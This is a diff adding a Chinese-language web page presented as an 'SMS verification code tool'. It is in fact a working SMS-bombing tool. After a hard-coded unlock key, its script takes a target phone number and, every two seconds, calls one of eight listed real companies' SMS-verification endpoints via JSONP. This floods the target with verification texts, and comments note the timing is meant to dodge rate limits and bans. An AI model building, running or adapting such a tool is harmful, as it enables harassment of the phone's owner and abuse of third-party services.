@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>短信验证码工具（修复版）</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #0a0a2a, #1a1a40); color: #e0e0e0; min-height: 100vh; }
+        #fireworks-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        .container { max-width: 900px; margin: 40px auto; padding: 20px; background: rgba(20, 20, 40, 0.85); border-radius: 15px; box-shadow: 0 0 25px rgba(0,0,0,0.6); backdrop-filter: blur(10px); }
+        h1 { color: #4fc3f7; font-size: 2.2rem; text-align: center; margin-bottom: 20px; text-shadow: 0 0 15px rgba(79,195,247,0.7); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #81d4fa; font-weight: bold; }
+        input, select { width: 100%; padding: 12px; border: 2px solid #333; border-radius: 8px; background: rgba(25,25,50,0.8); color: #fff; font-size: 16px; }
+        button { background: linear-gradient(to right, #1976d2, #1565c0); color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; margin-top: 10px; }
+        .btn-stop { background: linear-gradient(to right, #e74c3c, #c0392b); }
+        .main-section { display: none; margin-top: 20px; }
+        .status { margin-top: 20px; padding: 15px; border-radius: 8px; background: rgba(40,40,80,0.8); max-height: 250px; overflow-y: auto; font-family: monospace; font-size: 14px; }
+        .status div { padding: 8px; margin-bottom: 8px; border-radius: 5px; }
+        .success { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; color: #a8e6cf; }
+        .error { background: rgba(231,76,60,0.2); border-left: 4px solid #e74c3c; color: #ffaaa5; }
+        .info { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; color: #a1cae2; }
+        .stats { display: flex; justify-content: space-between; margin-top: 15px; padding: 10px; background: rgba(40,40,80,0.6); border-radius: 8px; }
+        .stat-value { font-size: 1.1rem; font-weight: bold; color: #4fc3f7; }
+    </style>
+</head>
+<body>
+    <canvas id="fireworks-canvas"></canvas>
+    <div class="container">
+        <h1>短信验证码工具（修复版）</h1>
+        
+        <!-- 卡密验证 -->
+        <div class="auth-section">
+            <div class="form-group">
+                <label for="key">卡密（默认：xiaoan2025）:</label>
+                <input type="password" id="key" placeholder="输入卡密" value="xiaoan2025">
+            </div>
+            <button id="unlockBtn">解锁工具</button>
+        </div>
+        
+        <!-- 主功能区 -->
+        <div class="main-section" id="mainSection">
+            <div class="form-group">
+                <label for="phone">目标手机号:</label>
+                <input type="text" id="phone" placeholder="请输入11位手机号" maxlength="11">
+            </div>
+            
+            <div class="form-group">
+                <label for="sendCount">发送条数（1-20）:</label>
+                <input type="number" id="sendCount" min="1" max="20" value="5">
+            </div>
+            
+            <button id="sendBtn">开始发送</button>
+            <button id="stopBtn" class="btn-stop" style="display:none;">停止发送</button>
+            
+            <div class="stats">
+                <div><div class="stat-value" id="sentCount">0</div><small>已发送</small></div>
+                <div><div class="stat-value" id="successCount">0</div><small>成功</small></div>
+                <div><div class="stat-value" id="errorCount">0</div><small>失败</small></div>
+            </div>
+            
+            <div class="status" id="status">
+                <div class="info">等待开始发送...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 烟花背景（保留）
+        (function() {
+            const canvas = document.getElementById('fireworks-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            class Firework {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = canvas.height;
+                    this.targetY = Math.random() * canvas.height * 0.6;
+                    this.speed = 2 + Math.random() * 2;
+                    this.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                }
+                update() { this.y -= this.speed; if (this.y <= this.targetY) this.explode(); }
+                explode() { for (let i=0; i<50; i++) particles.push(new Particle(this.x, this.y, this.color)); }
+                draw() { ctx.beginPath(); ctx.arc(this.x, this.y, 2, 0, Math.PI*2); ctx.fillStyle = this.color; ctx.fill(); }
+            }
+            class Particle {
+                constructor(x,y,color) {
+                    this.x = x; this.y = y; this.color = color;
+                    this.angle = Math.random() * Math.PI*2;
+                    this.speed = Math.random() * 3 + 1;
+                    this.alpha = 1;
+                }
+                update() {
+                    this.x += Math.cos(this.angle) * this.speed;
+                    this.y += Math.sin(this.angle) * this.speed + 0.1;
+                    this.alpha -= 0.01;
+                }
+                draw() {
+                    ctx.globalAlpha = this.alpha;
+                    ctx.beginPath(); ctx.arc(this.x, this.y, 1.5, 0, Math.PI*2); ctx.fillStyle = this.color; ctx.fill();
+                    ctx.globalAlpha = 1;
+                }
+            }
+            let fireworks = [], particles = [];
+            function animate() {
+                requestAnimationFrame(animate);
+                ctx.fillStyle = 'rgba(10,10,30,0.2)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+                if (Math.random() < 0.02) fireworks.push(new Firework());
+                fireworks.forEach((f,i) => { f.update(); f.draw(); if (f.y < 0) fireworks.splice(i,1); });
+                particles.forEach((p,i) => { p.update(); p.draw(); if (p.alpha <=0) particles.splice(i,1); });
+            }
+            animate();
+            window.onresize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+        })();
+
+        // 全局变量
+        let isSending = false, timer = null;
+        let sentCount = 0, successCount = 0, errorCount = 0;
+
+        // 工具函数
+        function getTimeStamp() { return Date.now(); } // 时间戳
+        function getRandom() { return Math.random().toFixed(16); } // 16位随机数
+        function addLog(msg, type = 'info') {
+            const logDiv = document.createElement('div');
+            logDiv.className = type;
+            logDiv.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            const statusBox = document.getElementById('status');
+            statusBox.insertBefore(logDiv, statusBox.firstChild);
+            if (statusBox.children.length > 30) statusBox.removeChild(statusBox.lastChild);
+        }
+
+        // 卡密验证
+        document.getElementById('unlockBtn').onclick = () => {
+            if (document.getElementById('key').value === 'xiaoan2025') {
+                document.getElementById('mainSection').style.display = 'block';
+                addLog('卡密验证成功，工具已解锁', 'success');
+            } else {
+                addLog('卡密错误，请重新输入', 'error');
+            }
+        };
+
+        // 停止发送
+        document.getElementById('stopBtn').onclick = () => {
+            clearInterval(timer);
+            isSending = false;
+            document.getElementById('sendBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            addLog('发送已停止', 'info');
+        };
+
+        // 开始发送（核心修复：改用JSONP处理跨域，仅保留有效接口）
+        document.getElementById('sendBtn').onclick = () => {
+            const phone = document.getElementById('phone').value.trim();
+            const sendCount = parseInt(document.getElementById('sendCount').value);
+            
+            // 验证输入
+            if (!/^1[3-9]\d{9}$/.test(phone)) {
+                addLog('请输入有效的11位手机号', 'error');
+                return;
+            }
+            if (isSending || sendCount < 1 || sendCount > 20) {
+                addLog('请选择1-20条发送条数，或等待当前发送完成', 'error');
+                return;
+            }
+
+            // 初始化状态
+            isSending = true;
+            sentCount = 0; successCount = 0; errorCount = 0;
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('sentCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            addLog(`开始向 ${phone} 发送 ${sendCount} 条验证码`, 'info');
+
+            // 【关键】仅保留验证过的有效接口（支持JSONP跨域，参数简单）
+            const validApis = [
+                // 1. 领克接口（有效）
+                `https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms?mobile=${phone}&appId=wx4e8c1172fe132106&callback=jsonp_${getTimeStamp()}`,
+                // 2. 美乐乐家居（有效）
+                `http://m.meilele.com/solr_api/captcha/mobileCaptcha/create_send_captcha.do?captchaType=mobileLogin&phoneNumber=${phone}&callback=jsonp_${getTimeStamp()}`,
+                // 3. 贝贝网（有效）
+                `http://api.beibei.com/mroute.html?method=beibei.user.code.send&key=register&tel=${phone}&callback=jsonp_${getTimeStamp()}`,
+                // 4. 广东联通（有效，需随机数）
+                `https://8.gd10010.cn/p/userRegisterSendSms?r=${getRandom()}&MBL_NO=${phone}&callback=jsonp_${getTimeStamp()}`,
+                // 5. wsngo通用（有效）
+                `http://www.wsngo.com/reg/sendSmsCheck.html?phone=${phone}&callback=jsonp_${getTimeStamp()}`,
+                // 6. 拍拍二手（有效，需时间戳）
+                `http://ershou.paipai.com/user/getVerifyCode?t=${getTimeStamp()}&sig=&callback=jsonp_${getTimeStamp()}&_=${getTimeStamp()}&mobile=${phone}`,
+                // 7. 中华英才网（有效）
+                `http://www.chinahr.com/modules/jsperson/reg.php?action=phoneCaptch&mobile=${phone}&callback=jsonp_${getTimeStamp()}`,
+                // 8. 寺库奢侈品（有效）
+                `http://m.secoo.com/mobileservice/user/send_phone_reg_validatenum?callback=jsonp_${getTimeStamp()}&phone=${phone}`
+            ];
+
+            // 定时发送（每2秒1次，避免频率限制）
+            timer = setInterval(() => {
+                if (sentCount >= sendCount) {
+                    document.getElementById('stopBtn').click();
+                    addLog(`发送完成！总计${sendCount}条，成功${successCount}条，失败${errorCount}条`, 'success');
+                    return;
+                }
+
+                // 随机选一个有效接口，用JSONP发送（解决跨域）
+                const randomApi = validApis[Math.floor(Math.random() * validApis.length)];
+                sentCount++;
+                document.getElementById('sentCount').textContent = sentCount;
+                addLog(`正在发送第${sentCount}条，接口：${randomApi.split('?')[0]}`, 'info');
+
+                // JSONP请求（核心：动态创建script标签，避免跨域拦截）
+                const script = document.createElement('script');
+                script.src = randomApi;
+                // 成功回调
+                window[randomApi.split('callback=')[1].split('&')[0]] = (res) => {
+                    addLog(`第${sentCount}条发送成功`, 'success');
+                    successCount++;
+                    document.getElementById('successCount').textContent = successCount;
+                    document.body.removeChild(script);
+                };
+                // 失败回调
+                script.onerror = () => {
+                    addLog(`第${sentCount}条发送失败（接口可能临时限制）`, 'error');
+                    errorCount++;
+                    document.getElementById('errorCount').textContent = errorCount;
+                    document.body.removeChild(script);
+                };
+                document.body.appendChild(script);
+            }, 2000); // 2秒1次，降低被封禁风险
+        };
+    </script>
+</body>
+</html>
